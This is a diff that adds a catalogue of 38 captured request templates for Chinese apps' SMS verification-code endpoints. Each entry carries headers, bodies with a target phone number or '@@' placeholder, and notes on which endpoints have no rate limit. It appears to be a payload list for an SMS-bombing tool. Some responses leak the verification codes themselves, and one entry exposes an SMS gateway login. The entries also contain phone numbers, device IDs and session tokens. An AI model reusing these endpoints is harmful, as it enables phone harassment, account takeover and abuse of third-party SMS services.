@@ -1,0 +1,726 @@
+1 在哪
+POST
+https://apinyx.chuangshangapp.com/account/basic/v2/postcode
+
+User-Agent: com.l99.bed/6.3.1(Android OS 7.0,SM-G9300)
+api-version: 9
+app-version: 6.3.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 234
+Host: apinyx.chuangshangapp.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+machine_code=355905073413357&client=key%3ABedForAndroid&market=chuangshang_yingyongbao&version=1.0&format=json&is_same_sign=true&is_emulator=false&lat=0&lng=90&local_name=%E6%9C%AA%E7%9F%A5&auth_type=20&auth_key=18032410846&country=CN
+
+60s
+
+{"code":1000,"data":{"code_type":1}}
+------------------------------------------------------------------------------------
+2 减肥小秘书
+GET
+
+http://www.jfxms.com/api/Mobile_RegisterSMSVerification?phone=18032410846
+
+Host: www.jfxms.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+DeviceId: ANDROID_ID:6c4f738c963b01cd
+SystemVersion: 7.0
+DeviceType: android
+LocalVersion: 5.4.7
+user-agent: Mozilla/5.0 (Linux; Android 7.0; SM-G9300 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36
+MarketChannel: yingyongbao
+
+60s
+
+{"Result":true,"Content":{"SuccessMessage":"发送成功。"},"Error":null,"IsCompress":false,"ScoreExp":null}
+
+
+
+------------------------------------------------------------------------------------
+3 春雨医生
+POST
+
+https://api.chunyuyisheng.com/api/accounts/send_activate_code/?app=0&client=me.chunyu.ChunyuDoctor&platform=android&version=8.5.6&app_ver=8.5.6&imei=355905074543357&device_id=355905074543357&phoneType=SM-G9300_by_samsung&vendor=yingyongbao1
+
+Tingyun-Process: true
+X-Tingyun-Id: FKddX0BlpCc;c=2;r=475984298
+TIMESTAMP: 1518405288
+SIGN: 25CA2C14683EB80EC5A6992A6D8C52F
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Chunyuyisheng/8.5.6 (Android 7.0;SM-G9300_by_samsung)
+Host: api.chunyuyisheng.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 17
+
+phone=18032410846
+
+无限制(我的手机没有收到)
+
+{success:true}
+
+------------------------------------------------------------------------------------
+4 V电影
+POST
+
+https://passport.xinpianchang.com/api/v1/mobile/send
+Cache-Control: max-age=0
+Device-Id: 354730010702086
+User-Agent: VmovierApp 5.6.2 / Android 4.4.2 / WIFI / 720*1280 / 1.5
+Authorization: C30FD5EEC9C582C95C9C584D81C9C58B333C9C58966C358BE531
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Host: passport.xinpianchang.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+phone=18032410846&prefix_code=%2B86&is_register=1
+
+60s
+
+{"status":0,"msg":"OK","data":{"phone":"18032410846","prefix_code":"+86"}}
+
+--------------------------------------------------------------------------------------
+5 万门大学
+GET
+
+https://api.wanmen.org/4.0/main/verification-code?account=18032410846&businessType=signin
+
+Host: api.wanmen.org
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Authorization: 
+User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36,Build.VERSION.SDK_INT:19,BuildConfig.VERSION_NAME:6.0.4
+Accept: vnd.wanmen. v6+json
+X-App: uni
+X-Token: b30c43443c40691362a746693dff8f0d
+X-Time: 5a8144b9
+
+
+未知
+
+无
+-------------------------------------------------------------------------------------------
+6 安心肿瘤营养
+POST
+
+http://www.nutreat.cn/nutreat/Home/userAuth/request_code
+accept: application/json
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-Length: 21
+Host: www.nutreat.cn
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Cookie: PHPSESSID=fqoc1uq20b6pu0bq49e74bmom6
+User-Agent: okhttp/3.4.1
+
+telephone=18032410846
+-------------------------------------------------------------------------------------------
+7 界面新闻
+POST
+
+https://appapi.jiemian.com/v4/5.5.1/10001/user/smscode.json?vid=354730010702086&dv=android&os=4.4.2&rl=720*1280&ac=WIFI
+
+User-Agent: JiemianNews/5.5.1 (android; android 4.4.2; SM-G955N)
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Host: appapi.jiemian.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+email=18032410846&type=1&source=jm_app
+
+60s
+
+code 0
+-------------------------------------------------------------------------------------------
+8 生日管家
+
+POST
+https://api.octinn.com/account/send_verify_code
+
+Content-Type: application/json; charset=UTF-8
+Content-Length: 58
+Host: api.octinn.com
+Connection: Keep-Alive
+User-Agent: BRA 9.5.1 (samsung, SM-G955N;  Android 19; zh_CN chn/2071 material/null)
+Accept-Encoding: gzip
+OI-AUTH: 
+OI-APPKEY: 20fb59e10b0d0b9823fb2a6c715f3ce6
+OI-CHN: 2071
+OI-UDID: 95fa50d9aa89ec0a8a59497c59f3e4a0
+OI-APIVER: 42
+material: 
+
+{"type":5,"ticket":"","authCode":"","phone":"18032410846"}
+
+竟然无限制
+
+------------------------------------------------------------------------------------------------
+9 e融所理财
+https://m.myerong.com/auth.action?method=delivery
+
+Cache-Control: max-age=50000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Host: m.myerong.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Cookie: __jsluid=20fca65167bcc90c23d0c4984a3ad683
+User-Agent: okhttp/3.9.1
+
+
+accountName=18032410846&verifyCode=
+
+60s
+------------------------------------------------------------------------------------------------
+10 美摄
+
+GET
+
+http://community.meishe-app.com/meishe/cellphoneregisterlogin/?command=registerSendVerificationCode&cellphoneNumber=18032410846&null
+
+Accept-Encoding: 
+Cache-Control: no-cache
+Host: community.meishe-app.com
+Connection: Keep-Alive
+User-Agent: okhttp/3.9.0
+
+60s
+
+------------------------------------------------------------------------------------------------
+11 名人朋友圈
+POST
+
+https://api.mrpyq.com/pass/send_phone_code_new
+
+User-Agent: MingPeng/3.1.1
+mpc-os: 19
+mpc-ver: 3.1.1
+mpc-mac: 70%3A20%3A84%3A00%3AA0%3A89
+mpc-type: SM-G955N
+mpc-token: 354730010702086
+mpc-network: wifi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 63
+Host: api.mrpyq.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+access_token=&action=reg&phone=18032410846&phone_areacode=%2B86
+
+竟然无限制
+
+{"result": 1}
+------------------------------------------------------------------------------------------------
+12 即陌美女视频（有sign无校验）
+POST
+
+https://jimoo-api.xys.ren/action/getMyVerifyCode?input=cthvbcGG%2BcQXyPv0cYrbCZAmhzEWXW1sUJdzqqlzJ4cnXfWGKSTw7hp87Kwf7auLHCp8MCZwu3VBrA3IO%2FAbz7MqxGbcUAmmwevGYE%2B83zxTqIyv5suAQDNaYjdclmMjpxUjrO0FVBVzIGTtONJ7LEbX6zNl%2FgLjN7m%2FZ20VLGbj9BgMV3bESV3wEE9MD6wajv4X64rMgLfagC0qDXDQAxJya9JX9oN0fb3LH9IJgzSki4s7o7uvTI0CZmm%2Btwuj8ly%2BRVpvUN%2B4Z3sRInLVXkq0%2BM2nYF%2B%2FzelLX6sjMXbBMNzZ0SqPHP39fbSXBnftSQ%3D%3D
+
+sign: e93omfllfU9gdYPRyNkwdHVkEi1hOYDAMBJ9ygCqbBRHtRbsYNb2SzxlQmpnXbAvIoJ4jTHc5OJxmd%2BiwhOvlSA3pJnYSszKzQzsOB6NieiDClkM3mQOomXBNz0Yc%2FtO2WwZn18SOe2dGCmgyF7DSw8ruR%2FvB%2FUMG1qQmijTIgZEeko7uSxMBb0sQ4Iq6BLZdJRXUk71thdmn9K9Bks6OUs%3D
+x-requested-with: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Host: jimoo-api.xys.ren
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.9.0
+
+
+code=86&mobile=18032410846&sendtype=1&type=1&uid=-1
+
+60s
+
+{"status":"1","content":"\u53d1\u9001\u6210\u529f"}
+------------------------------------------------------------------------------------------------
+13 时光小屋
+POST
+
+https://api.shiguangxiaowu.cn/zh-CN/verify_codes
+
+User-Agent: com.liveyap.timehut/5.2.1 (android 4.4.2, SM-G955N) (SOURCE/huaweistore, VERSION_CODE/252)
+Accept: application/vnd.timehut.v5+json
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 43
+Host: api.shiguangxiaowu.cn
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+
+
+reset=false&phone=18032410846&phone_code=86
+
+
+
+无限制
+
+
+------------------------------------------------------------------------------------------------
+14 朴朴超市
+
+GET
+
+https://101.37.223.217/Users/Phone?phone=18032410846&device_id=e0622518f91648999a78c5625c75d063&type=0&token=69a452f8c45b04d0
+
+pp-os: 10
+pp-version: 2018010100
+Host: 101.37.223.217
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.6.0
+
+60s
+
+{"errcode":0,"errmsg":null}
+------------------------------------------------------------------------------------------------
+15 全民听书
+
+GET
+
+
+https://sc.sm.qudu99.com/Service/Api.ashx?act=6012&mobile=18032410846&checktype=1&sessionid=4_74_5120026_1.09__720x1280_5SKxuxeg4OnFWtybvQyDOg==&L10n=cn&ver=74&mt=4&ft=simp&nightmode=0&ProBundleId=com.app.lrlisten&styletheme=0000&tabtheme=1&mainstyle=4&buildmodel=SM-G955N&buildver=4.4.2&appad=false
+
+ACCEPT: */*
+CONNECTION: Keep-Alive
+CONTENT-TYPE: application/x-www-form-urlencoded
+ACCEPT-LANGUAGE: zh-cn
+ACCEPT-CHARSET: UTF-8
+Host: sc.sm.qudu99.com
+Accept-Encoding: gzip
+User-Agent: okhttp/3.6.0
+
+
+无限制
+
+------------------------------------------------------------------------------------------------
+16 鲁小姐理财
+
+POST
+
+https://www.misslubank.com/api/send_mobile_verifycode.htm
+
+Accept-Encoding: gzip
+User-Agent: {"_app_type":"android","_device":"SM-G955N","_device_os":"4.4.2"}
+App-Token: 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 142
+Host: www.misslubank.com
+Connection: Keep-Alive
+
+_app_type=android&_channel=MissLuBank_%E5%8D%8E%E4%B8%BA&_app_version=6&mobile=18032410846&verifyType=REGIST&_device_os=4.4.2&_device=SM-G955N
+
+
+60s
+
+{"code":"SUCCESS"}
+------------------------------------------------------------------------------------------------
+17 EVCARD
+
+POST
+
+https://mas.evcard.vip:8443/evcard-mas/evcardapp?service=getSMSVerifyCode&appkey=evcardapp&timestamp=1518425454235&random=RbFMv7&token=&sign=82E067E6DA80012C07BB57307B595551
+
+Content-type: application/json;charset=utf-8
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G955N Build/NRD90M)
+Host: mas.evcard.vip:8443
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 38
+
+{"mobilePhone":"18032410846","type":2}
+
+60s
+
+{"serialNum":0,"status":0,"message":"验证码已发送到您的手机上。","serviceName":"getSMSVerifyCode","token":null}
+
+------------------------------------------------------------------------------------------------
+18 交广领航
+GET
+
+https://radio.jgrm.net/Auth/auth/verificate/code?value=18032410846&type=1&ptt=0&v=390&sid=HN0001
+
+Content-Type: application/json;charset=utf-8
+AUTHORITY: 
+jglh-agent: jglh-app-android
+Host: radio.jgrm.net
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)
+
+60s
+------------------------------------------------------------------------------------------------
+19 开眼视频
+
+POST
+
+https://account.kaiyanapp.com/v1/api/sms/initialization
+
+Connection: keep-alive
+Cookie: ky_auth=
+x-api-key: 0530ee4341324ce2b26c23fcece80ea2
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+Content-Length: 241
+Host: account.kaiyanapp.com
+Accept-Encoding: gzip
+User-Agent: okhttp/3.5.0
+
+type=sms&telephone=18032410846&udid=57f3bf7284d141119a1be94cccffcefe43e0b8cd&vc=269&vn=3.15&deviceModel=SM-G955N&first_channel=eyepetizer_zhihuiyun_market&last_channel=eyepetizer_zhihuiyun_market&system_version_code=19&token=895877ea19a9ece5
+
+60s
+
+json error 0
+------------------------------------------------------------------------------------------------
+20 积木
+
+POST
+
+https://www.gmugmu.com/api/account/sendregsms
+
+Accept-Language: zh-CN,zh;q=0.8
+User-Agent: %E7%A7%AF%E7%9B%AE/1.7.1 CFNetwork/808.3 Darwin/16.3.0
+os: android
+equipment: %7B%22BRAND%22%3A%22samsung%22%2C%22SDK_INT%22%3A19%2C%22SDK_RELEASE%22%3A%224.4.2%22%2C%22MODEL%22%3A%22SM-G955N%22%7D
+version: 2.0.5
+device: f56edfa0-1c14-3022-b150-a098158c1d79
+timestamp: 1518426372
+signature: ff93f76e2069c1a53e3166f2a9dfcdca
+Content-Type: application/json;charset=utf-8
+Content-Length: 68
+Host: www.gmugmu.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+{"sign":"ab4c794629087b4ad1d91327e9c2364e","mobile":"8618032410846"}
+
+60s
+
+
+{"code":0,"message":"\u53d1\u9001\u6210\u529f"}
+
+------------------------------------------------------------------------------------------------
+21 中安新媒
+GET
+
+http://sso2.aqsc.cn/SSOv2/user/sendCode?type=phone&value=18032410846&random=1518426724569
+
+
+Host: sso2.aqsc.cn
+Connection: keep-alive
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
+Referer: http://sso2.aqsc.cn/SSOv2/user/register
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,en-US;q=0.8
+Cookie: JSESSIONID=DDDA16AB900426288539D27906498BB3
+
+60s
+
+------------------------------------------------------------------------------------------------
+22 图虫
+POST
+
+https://api.tuchong.com/captcha/sms?language=zh&resolution=720*1280&device_type=OPPO%20R11&device_platform=android&os_api=19&device_brand=OPPO%20&openudid=70208400a0893585&_rticket=1518428916666&version_code=350&version_name=3.5.0&ac=wifi&aid=1130&dpi=240&iid=26215705086&uuid=48323201936&device_id=48323201936&ssmix=a&os_version=4.4.2&channel=tengxun&app_name=tuchong&update_version_code=-1&manifest_version_code=350
+
+device: 48323201936
+version: 350
+channel: tengxun
+platform: android
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Host: api.tuchong.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.8.0
+host-address: 192.168.170.123
+host-name: 192.168.170.123
+
+
+mobile_number=18032410846
+
+60s
+
+{"message":"\u53d1\u9001\u6210\u529f","result":"SUCCESS"}
+
+------------------------------------------------------------------------------------------------
+23 小众生活
+POST
+
+http://api.chinadianmimi.com/code/sendcode?mobile=18032410846&mtype=reg
+
+Content-Length: 0
+Host: api.chinadianmimi.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.4.1
+
+无限制
+
+{
+  "msgcode": 0,
+  "msg": "success",
+  "data": null
+}
+
+------------------------------------------------------------------------------------------------
+24 小尾巴翻译官
+
+POST
+
+https://te.itakeeasy.com/v6/account/phone/password/login
+
+
+xwbToken: 89e7f8ba-0b42-434a-8ee7-ef0bb4cb99c3
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 219
+Host: te.itakeeasy.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.8.1
+
+
+phone=18032410846&channelName=huawei&system=2&appVersionB=611&appVersion=6.1.1&userId=&locale=zh_CN&deviceModel=OPPO%20R11&udid=82385b76f2c9d148a231b7362f28b08b&password=96e79218965eb72c92a549dd5a330112&sysVersion=4.4.2
+
+
+
+{"result":"1","data":{"userId":null,"image":null,"nickName":null,"phone":"18032410846","email":null,"thirdPartyId":null,"times":null,"channelName":null,"oldCoin":0,"couponData":null,"coinShareNum":null,"identifyingCode":"456298","needImageCode":false}}
+
+------------------------------------------------------------------------------------------------
+25掠影
+
+GET  
+
+http://59.110.152.98:8080/lveying/sms/sendSms?phone=18032410846&type=REGISTER_TYPE
+
+Content-Length: 0
+Host: 59.110.152.98:8080
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.8.1
+------------------------------------------------------------------------------------------------
+26 废品大叔专业版
+
+GET
+
+https://api.feipindashu.com/major/v1/sms/register?telephone=18032410846&__domain=api.feipindashu.com
+
+accept: application/json
+authorization: null
+host: api.feipindashu.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Cookie: beegosessionID=8489449ba4df36dfa7d607fe02641d54
+User-Agent: okhttp/3.4.1
+
+{"code":0,"msg":"发送成功","record_count":0,"current_page":0,"page_size":0}
+
+------------------------------------------------------------------------------------------------
+27 运动故事
+
+POST
+
+https://api.sportstory.cn/sms
+
+Content-Type: application/json; charset=UTF-8
+Content-Length: 24
+Host: api.sportstory.cn
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.8.0
+
+{"mobile":"18032410846"}
+
+{"status":1,"message":"SUCCESS"}
+
+------------------------------------------------------------------------------------------------
+28 奖励网
+
+POST
+
+http://101.201.100.220:8080/nmmd/login.do?mobile=18032410846&password=666666&type=2&flag=88
+
+Content-Type: application/json; charset=utf-8
+Content-Length: 0
+Host: 101.201.100.220:8080
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/2.7.0
+
+------------------------------------------------------------------------------------------------
+
+29 乐E教练
+
+POST
+
+http://47.93.155.23/api/v1/login/sendVerificationCode
+
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+Host: 47.93.155.23
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.3.0
+
+
+requestType=c2V0NTma8%2BI%3D&phoneNumber=18032410846
+
+{"result":"RESULT_SUCCESS"}
+
+------------------------------------------------------------------------------------------------
+30 与糖
+
+GET
+
+http://chronos.ihealthlabs.com.cn/dataservice/user/patient/request_verify_code?phone=18544526325
+
+Host: chronos.ihealthlabs.com.cn
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.3.0
+
+{"errno":0,"errmsg":"","data":"OK"}
+------------------------------------------------------------------------------------------------
+31 贝壳网
+
+POST
+
+http://qualityapp.bakclass.com/rc/v1/user/get_sms_code
+
+Content-Type: application/json; charset=utf-8
+X-Uid: 
+requiredParam: {"deviceIdentify":"70208400a0893585","versionName":"4.0.3","userId":"","systemVersion":"android 4.4.2","terminalName":"OPPO OPPO R11","productlineType":4,"producType":10,"networkType":1,"versionCode":33,"deviceType":2}
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; OPPO R11 Build/NMF26X)
+Host: qualityapp.bakclass.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 62
+
+{"login_phone":"15478563254","message_identify_type":"130001"}
+
+{"smscode":0,"responseStatus":{"resultcode":0,"msg":"成功"}}
+
+------------------------------------------------------------------------------------------------
+32 雅思哥
+
+POST
+
+https://ieltsbroapplication.hcp.tech:9998/app_utility/send_verify_code
+
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+Host: ieltsbroapplication.hcp.tech:9998
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.8.1
+
+reason=register&zone=86&mobile=13255669663&deviceid=f0a9f4c5-4732-48ed-80b2-247cd8109a65
+
+{"status":0,"message":"验证码发送成功"}
+
+------------------------------------------------------------------------------------------------
+33 家播网
+
+GET
+
+https://android.handtv.cn/v2/mobile/18655552221
+
+Host: android.handtv.cn
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.6.0
+
+{"code":200,"msg":"请求成功","valiCode":"7857"}
+
+------------------------------------------------------------------------------------------------
+34 王果果
+
+POST
+
+http://jk.guoguoliao.com/Server/App/api.aspx?Cmd=SendMsg
+
+Accept-Encoding: gzip
+User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
+Charset: UTF-8
+Connection: Keep-Alive
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: jk.guoguoliao.com
+Content-Length: 63
+
+liyou=%E6%B3%A8%E5%86%8C%2F%E7%99%BB%E5%BD%95&Phone=15544445555
+
+{"Status":200,"Rows":"","Remarks":"程序正常"}
+
+------------------------------------------------------------------------------------------------
+35 MOZIK
+
+GET 
+https://api.mozik.cc/v3/users/sms_verify?telephone=18032410846&uuid=7ee1313264914423b9e754b15ffc81a0
+
+Authorization: Bearer bW96aWsyLjAuMGFiYw==
+Host: api.mozik.cc
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/2.7.5
+
+{"code":"200","verifycode":"3581"}
+
+------------------------------------------------------------------------------------------------
+36 趣唱
+
+POST
+
+http://app.srv.quchangkeji.com:8083/tsAPI/vip/getSmsCode.do
+
+params: okhttp3.FormBody@4a8c5d2c
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Host: app.srv.quchangkeji.com:8083
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.2.0
+
+params=%7B%22type%22%3A%223%22%2C%22font%22%3A%221%22%2C%22phone%22%3A%2218566665555%22%7D
+
+{"status":{"code":"0","msg":"验证码已发送"},"data":{"code":"567895"}}
+
+------------------------------------------------------------------------------------------------
+37 配音师
+
+POST
+
+http://www.chinaweimei.com:5001/SendSms.aspx
+
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 339
+Host: www.chinaweimei.com:5001
+Connection: Keep-Alive
+Accept-Encoding: gzip
+User-Agent: okhttp/3.6.0
+
+account=%E9%85%8D%E9%9F%B3%E5%A4%A7%E5%B8%88&pswd=123456&mobiles=@@&msg=%E6%82%A8%E7%9A%84%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%EF%BC%9A155934%E3%80%82%E5%A6%82%E9%9D%9E%E6%9C%AC%E4%BA%BA%E6%93%8D%E4%BD%9C%EF%BC%8C%E8%AF%B7%E5%BF%BD%E7%95%A5%E6%9C%AC%E7%9F%AD%E4%BF%A1%E3%80%90%E9%85%8D%E9%9F%B3%E5%A4%A7%E5%B8%88%E3%80%91
+
+{"status": "0","returnmsg": "发送成功！","taskid": "201802141118347109","expenses": "1","remaining": "13005","sendtime": "2018-02-14 11:18:34"}
+
+------------------------------------------------------------------------------------------------
+38 共享U车
+
+POST
+
+http://www.enjoyucar.com:8200/api/v1/base
+
+Accept: application/json
+Content-Type: application/json; charset=UTF-8
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; OPPO R11 Build/NMF26X)
+Host: www.enjoyucar.com:8200
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 177
+
+{"RequestParas":"{\"Type\":\"register\",\"Phone\":\"@@\"}","Token":"","Device":"2","Url":"http:\/\/www.enjoyucar.com:8200\/api\/v1\/verification_code","HttpMethod":"1"}
+
+{"statusCode":"200","suc":true,"msg":"发送验证码成功","data":{"result":"1"}}
+
+------------------------------------------------------------------------------------------------
